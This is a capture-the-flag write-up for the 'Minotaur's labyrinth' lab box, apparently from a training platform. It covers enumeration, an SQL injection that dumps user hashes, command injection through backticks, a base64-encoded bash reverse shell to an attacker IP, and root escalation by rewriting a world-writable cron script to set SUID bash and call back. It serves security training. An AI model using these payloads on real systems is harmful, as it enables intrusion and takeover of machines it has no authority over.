# Minotaur's labyrinth

![minotaur](login.jpg)

## Enumeration

### nmap

```
PORT     STATE SERVICE  REASON  VERSION
21/tcp   open  ftp      syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15 14:57 pub
80/tcp   open  http     syn-ack Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
|_http-favicon: Unknown favicon MD5: C4AF3528B196E5954B638C13DDC75F2F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp  open  ssl/http syn-ack Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
|_http-favicon: Unknown favicon MD5: BE43D692E85622C2A4B2B588A8F8E2A6
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE/localityName=Berlin
| Issuer: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE/localityName=Berlin
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2004-10-01T09:10:30
| Not valid after:  2010-09-30T09:10:30
| MD5:   b181 18f6 1a4d cb51 df5e 189c 40dd 3280
| SHA-1: c4c9 a1dc 528d 41ac 1988 f65d b62f 9ca9 22fb e711
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAk+gAwIBAgIBADANBgkqhkiG9w0BAQQFADBcMQswCQYDVQQGEwJERTEP
| MA0GA1UECBMGQmVybGluMQ8wDQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNo
| ZSBGcmllbmRzMRIwEAYDVQQDEwlsb2NhbGhvc3QwHhcNMDQxMDAxMDkxMDMwWhcN
| MTAwOTMwMDkxMDMwWjBcMQswCQYDVQQGEwJERTEPMA0GA1UECBMGQmVybGluMQ8w
| DQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNoZSBGcmllbmRzMRIwEAYDVQQD
| Ewlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMzLZFTC+qN6
| gTZfG9UQgXW3QgIxg7HVWnZyane+YmkWq+s5ZrUgOTPRtAF9I0AknmAcqDKD6p3x
| 8tnwGIWd4cDimf+JpPkVvV26PzkuJhRIgHXvtcCUbipi0kI0LEoVF1iwVZgRbpH9
| KA2AxSHCPvt4bzgxSnjygS2Fybgr8YbJAgMBAAGjgbcwgbQwHQYDVR0OBBYEFBP8
| X524EngQ0fE/DlKqi6VEk8dSMIGEBgNVHSMEfTB7gBQT/F+duBJ4ENHxPw5Sqoul
| RJPHUqFgpF4wXDELMAkGA1UEBhMCREUxDzANBgNVBAgTBkJlcmxpbjEPMA0GA1UE
| BxMGQmVybGluMRcwFQYDVQQKEw5BcGFjaGUgRnJpZW5kczESMBAGA1UEAxMJbG9j
| YWxob3N0ggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEAFaDLTAkk
| p8J2SJ84I7Fp6UVfnpnbkdE2SBLFRKccSYZpoX85J2Z7qmfaQ35p/ZJySLuOQGv/
| IHlXFTt9VWT8meCpubcFl/mI701KBGhAX0DwD5OmkiLk3yGOREhy4Q8ZI+Eg75k7
| WF65KAis5duvvVevPR1CwBk7H9CDe8czwrc=
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql?   syn-ack
| fingerprint-strings:
|   Kerberos, LDAPBindReq, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest:
|_    Host 'ip-10-8-226-203.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
| mysql-info:
|_  MySQL Error: Host 'ip-10-8-226-203.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=11/14%Time=619044B8%P=x86_64-pc-linux-gnu%r(N
SF:ULL,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-8-226-203\.eu-west-1\.compute\
SF:.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
SF:riaDB\x20server")%r(RPCCheck,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-8-226
SF:-203\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20co
SF:nnect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,69,"e\0\0\x0
SF:1\xffj\x04Host\x20'ip-10-8-226-203\.eu-west-1\.compute\.internal'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(TerminalServerCookie,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-8-226-203
SF:\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20connec
SF:t\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionReq,69,"e\0\0\x01\xf
SF:fj\x04Host\x20'ip-10-8-226-203\.eu-west-1\.compute\.internal'\x20is\x20
SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(
	SF:Kerberos,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-8-226-203\.eu-west-1\.com
	SF:pute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\
	SF:x20MariaDB\x20server")%r(SMBProgNeg,69,"e\0\0\x01\xffj\x04Host\x20'ip-1
	SF:0-8-226-203\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20t
	SF:o\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq,69,"e\0
	SF:\0\x01\xffj\x04Host\x20'ip-10-8-226-203\.eu-west-1\.compute\.internal'\
	SF:x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20se
	SF:rver")%r(WMSRequest,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-8-226-203\.eu-
	SF:west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20
	SF:to\x20this\x20MariaDB\x20server");

```

### ffuf

```
ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://10.10.130.216/FUZZ -fs 3562

.htpasswd               [Status: 403, Size: 1021, Words: 104, Lines: 43]
.htaccess               [Status: 403, Size: 1021, Words: 104, Lines: 43]
.hta                    [Status: 403, Size: 1021, Words: 104, Lines: 43]
css                     [Status: 301, Size: 233, Words: 14, Lines: 8]
imgs                    [Status: 301, Size: 234, Words: 14, Lines: 8]
js                      [Status: 301, Size: 232, Words: 14, Lines: 8]
logs                    [Status: 301, Size: 234, Words: 14, Lines: 8]
phpmyadmin              [Status: 403, Size: 1190, Words: 129, Lines: 46]
```

First flag is in ftp `.secret folder`

we also get `message.txt` and `keep_in_mind.txt` files

flag #1
fl4g{Hermes_was_not_that_fast}

The messages say something about a `timer` And an invitation to look around

Don't mind if I do

I tried to fuzz for directories and oh boy it was not simple even with filters

haha jebait.html is a cool page but not useful

```
<!-- response - oh would have thouhgt it would be this easy :) -->
```

The `logs` dir on other hand got a `post_log` file

```
Referer: http://127.0.0.1/minotaur/minotaur-box/login.html
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=8co2rbqdli7itj8f566c61nkhv
Connection: close

email=Daedalus&password=g2e55kh4ck5r
```

Alternativel there is a riddle in the source code of login page

you can reconstitute daedalus password solving it, but me I just found them in logs

Now we can login...and there is a search bar...

with the sql database and phpmyadmin installations we found all this now scream SQLI

And the source code says

```
<!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
```

first we try what we know and get

```
4 Daedalus b8e4c23686a3a12476ad7779e35f5eb6
```

Sql injection is an art that require patience

We try deadalus + common payloads

And this works

`Daedalus' or 1=1#`

```
1 Eurycliedes 42354020b68c7ed28dcdeabd5a2baf8e //greeklover
2 Menekrates 0b3bebe266a81fbfaa79db1604c4e67f //greeksalad
3 Philostratos b83f966a6f5a9cff9c6e1c52b0aa635b //nickthegreek
4 Daedalus b8e4c23686a3a12476ad7779e35f5eb6 //g2e55kh4ck5r
5 M!n0taur 1765db9457f496a39859209ee81fbda4 //aminotauro
```

Minotaur is the only worthy stuff here

flag #2
fla6{the_labyrinh_was_not_that_deep}

The guy also got a `secret-suff` page with an echo panel

ugh...regexes `/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/`

The panel just echoes whatever goes in...it uses a search argument

Fooling around with it it doesnt echo some charachters: `"` (double quote)

some are sanitized : `'` (single quote), `#` (hashtag)...and many more

```
You really think this is gonna be possible i fixed this @Deadalus -\_- !!!?
```

Actually one special char allows us to escape that regex : `` ` `` (that..thing)

Nevermind `|` (pipe vertical bar works too)...

Now I feel like injecting a shell there

```
`id`
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

kudos!...time to get inside (revshells.com)

`` `bash -i >& /dev/tcp/10.8.226.203/2311 0>&1` ``

That didnt work...there must be a sort of filter

base64 encoding the payload it is

`YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjIyNi4yMDMvMjMxMSAwPiYx`

Then injecion...

we decode it on server side and write it to shell.sh

`` `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjIyNi4yMDMvMjMxMSAwPiYx | base64 -d | tee /tmp/shell.sh` ``

```
bash -i >& /dev/tcp/10.8.226.203/2311 0>&1
```

Next we run that shell
`` `/bin/bash /tmp/shell.sh` ``

And we are in

`cat dbConnect.php`

```
<?php

$servername = "localhost";
$db = "labyrinth";
$usr = "root";
$pwd = "";
//$pwd = "bQXHS5KnfGAHaa383nFjT42AUMyWb";
try {
	$conn = new PDO("mysql:host=$servername;dbname=$db", $usr, $pwd);
	$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


} catch (PDOException $e) {
	die();
}

?>
```

lol no password That might always be good to know

```
daemon@labyrinth:/home/user$ cat flag.txt
cat flag.txt

flag #3
fla9{the_minotaur_was_just_a_hipster}
```

## Privilege Escalation

Now privesc?

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
```

lets explore Minotaur's home folder....nothing useful

where is that timer they were talking about???

`find / -perm u=s 2> /dev/null`

the process hanged....geez (that shell is not very...stable)...anyway not very useful

Manualy exploring then...we start from `/` folder and we see a `"timers"` folder

```
cd timers
daemon@labyrinth:/timers$ls -al
ls -al
total 12
drwxrwxrwx 2 root root 4096 jún 15 18:01 .
drwxr-xr-x 26 root root 4096 nov 9 13:37 ..
-rwxrwxrwx 1 root root 70 jún 15 18:01 timer.sh
```

we have all permissions on timer.sh

```
cat timer.sh
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
```

It appends this to the txt file...probably running as a cron task (it updated in live)

But look at the Owner...ROOT

if we add a shell to it we can catch a connection as root...or more simply make it spawn a shell directly

```
echo '
#!/bin/bash
chmod +s /bin/bash
' > timer.sh (or >> to just append)
```

Basically we use the root power of this script to make bash a SUID (as we can)

and now we can just...

`/bin/bash -p`

Ok that did not work for me So i decided to just try the shell too

```
echo '
#!/bin/bash
bash -i >& /dev/tcp/10.8.226.203/4444 0>&1
' >> timer.sh //port 4444
```

Now we wait...(gotta be patient there)

```
id
uid=0(root) gid=0(root) groups=0(root)
root@labyrinth:~#

root@labyrinth:~# cat da_king_flek.txt
```

Flag #4

```
cat da_king_flek.txt
fL4G{escaped_the_labyrinth}
```

That room was just cool
